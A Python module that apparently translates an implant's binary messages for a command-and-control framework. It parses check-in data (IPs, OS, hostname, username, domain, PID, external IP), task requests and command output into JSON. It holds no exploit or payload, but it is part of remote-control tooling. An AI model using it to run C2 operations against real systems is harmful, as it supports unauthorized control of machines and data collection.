from translator.utils import *
import ipaddress

def checkIn(data):
    
    # Retrieve UUID
    uuid = data[:36]
    data = data[36:]
    
    # Retrieve IPs
    numIPs = int.from_bytes(data[0:4])
    data = data[4:]
    i = 0
    IPs = []
    while i < numIPs:
        ip = data[:4]
        data = data[4:]
        addr = str(ipaddress.ip_address(ip))
        IPs.append(addr)
        i += 1
        
    # Retrieve OS
    targetOS, data = getBytesWithSize(data)
    
    # Retrive Architecture
    archOS = data[0]
    if archOS == 0x64:
        archOS = "x64"
    elif archOS == 0x86:
        archOS = "x86"
    else:
        archOS = ""
    data = data[1:]
    
    # Retrieve HostName
    hostname, data = getBytesWithSize(data)

    # Retrieve Username
    username, data = getBytesWithSize(data)

    # Retrieve Domaine
    domain, data = getBytesWithSize(data)
    
    # Retrieve PID
    pid = int.from_bytes(data[0:4])
    data = data[4:]

    # Retrieve Process Name
    processName, data = getBytesWithSize(data)

    #Retrieve External IP
    externalIP, data = getBytesWithSize(data)

    dataJson = {
            "action": "checkin",
            "ips": IPs,
            "os": targetOS.decode('cp850'),
            "user": username.decode('cp850'),
            "host": hostname.decode('cp850'),
            "domain": domain.decode('UTF-16LE'),
            "process_name":processName.decode('cp850'),
            "pid": pid,
            "uuid": uuid.decode('cp850'),
            "architecture": archOS ,
            "externalIP": externalIP.decode('cp850'),
        }
    
    return dataJson


def getTasking(data):
    numTasks = int.from_bytes(data[0:4])
    dataJson = { "action": "get_tasking", "tasking_size": numTasks }
    return dataJson


def postResponse(data):
    
    resTaks = []
    
    uuidTask = data[:36]
    data = data[36:]
    output, data = getBytesWithSize(data)
    jsonTask = {
        "task_id": uuidTask.decode('cp850'),
        "user_output":output.decode('cp850'),
    }

    jsonTask["completed"] = True
    resTaks.append(jsonTask)
    
    dataJson = {
        "action": "post_response",
        "responses": resTaks
    }
    return dataJson
